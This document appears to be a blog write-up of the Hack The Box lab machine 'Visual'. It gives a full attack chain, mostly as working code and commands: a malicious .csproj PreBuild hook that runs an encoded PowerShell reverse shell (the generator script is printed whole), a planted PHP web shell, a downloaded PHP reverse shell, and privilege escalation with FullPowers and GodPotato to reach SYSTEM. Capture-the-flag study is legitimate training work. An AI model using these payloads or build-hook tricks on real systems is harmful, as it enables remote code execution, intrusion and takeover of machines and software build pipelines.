---
layout: post
title:  Visual htb
description: 
date:   2018-04-21 15:01:35 +0300
image:  '/images/20.jpg'
tags:   [Writeup, HTB]
---


## Nmap
```
 sudo nmap -p- 10.10.11.234  -T4 -A
 Nmap scan report for 10.10.11.234
Host is up (0.16s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
|_http-title: Visual - Revolutionizing Visual Studio Builds
```
Add `visual.htb` domain to our `/etc/hosts` file.
## Web Enumeration
We can upload our git repo here and it'll compile to make an exe or dll file.
Let's make a project
```
mkdir b17
dotnet new console -n b17 -f net6.0
dotnet new sln -n b17
dotnet s In b17.sln add b17/b17.csproj
```
Now creating a git repo for this project
```
git init
git add .
git commit -m "update"
git update-server-info
```
**Folder Structure**
```
├── b17
│   ├── b17.csproj
│   ├── obj
│   │   ├── b17.csproj.nuget.dgspec.json
│   │   ├── b17.csproj.nuget.g.props
│   │   ├── b17.csproj.nuget.g.targets
│   │   ├── project.assets.json
│   │   └── project.nuget.cache
│   └── Program.cs
└── b17.sln
```
Now we will upload it

```
python3 -m http.server 80
```

![Image description](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/mwmulbi4b4czpaubfsh7.jpg)
and the website does it works

![Image description](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/xra4v09ov3ufvsitcg6x.jpg)
## Gaining access
from here we can try to get a reverse shell using the csproj file
**Generate Reverse Shell**
```
#!/usr/bin/env python3
#
# generate reverse powershell cmdline with base64 encoded args
#

import sys
import base64

def help():
    print("USAGE: %s IP PORT" % sys.argv[0])
    print("Returns reverse shell PowerShell base64 encoded cmdline payload connecting to IP:PORT")
    exit()
    
try:
    (ip, port) = (sys.argv[1], int(sys.argv[2]))
except:
    help()

# payload from Nikhil Mittal @samratashok
# https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3

payload = '$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
payload = payload % (ip, port)

cmdline = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmdline)
```
```
python <filename>.py <IP> 9009
```
```
<Project Sdk="Microsoft.NET.Sdk">

  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net6.0</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
  </PropertyGroup>

  <Target Name="PreBuild" BeforeTargets="BeforeBuild">
    <Exec Command="<Output of filename.py>" />
  </Target>

</Project>

```
updating the git repo again
```
git add b17/b17.csproj
git commit -m "csproj update"
git update-server-info
python3 -m http.server 80
```
Setup Listener
```
nc -nvlp 9009
```
and we got a shell
```
type C:\\Users\\enox\\Desktop\\root.txt
```
## Lateral Movement to nt authority\local service
**Attacker**
```
echo -n "<?php system($_GET['cmd']);?>" | cat > b1.php
python -m http.server 80
```
**Victim**
```
Invoke-WebRequest -Uri http://your-ip:80/b1.php -OutFile C:\\xampp\\htdocs\\b1.php
```

![Image description](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ziwsvg6gwakaos4cqjjv.jpg)
## Privilege escalation
```
wget https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php
```
**Edit ip and port**

![Image description](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/zdn0jrcacdbd68itwtqy.png)
**Attacker**
```
python3 -m http.server 80
```
**Victim**
```
Invoke-WebRequest -Uri http://your-ip:80/php_reverse_shell.php -OutFile C:\\xampp\\htdocs\\php_reverse_shell.php
```
Setup **Listner**
```
ncat -lvnp 9008
```
Go to http://visual.htb/php_reverse_shell.php
**Boom we got reverse shell as nt authority\local service**
As the user is local service, we can restore the default privileges of the account using [FullPowers](https://github.com/itm4n/FullPowers)
**Attacker**
```
wget https://github.com/itm4n/FullPowers/releases/download/v0.1/FullPowers.exe
python -m http.server 80
```
**Victim**
```
Invoke-WebRequest -Uri http://your-ip:80/FullPowers.exe -OutFile C:\\xampp\\htdocs\\FullPowers.exe
.\FullPowers.exe 
whoami /priv
```
**Boom**

![Image description](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/pbu71ath05529oi0bxni.png)
then simply using [GodPotato ](https://github.com/BeichenDream/GodPotato)got nt authority\system
**Attacker**
```
wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe -O  GP4.exe
python -m http.server 80
```
**Victim**
```
Invoke-WebRequest -Uri http://your-ip:80/GP4.exe -OutFile C:\\xampp\\htdocs\\GP4.exe
.\GP4 -cmd "cmd /c type C:\Users\Administrator\Desktop\root.txt"
```
Go root.....
Hurray!!!!!!!!!!!!!!!
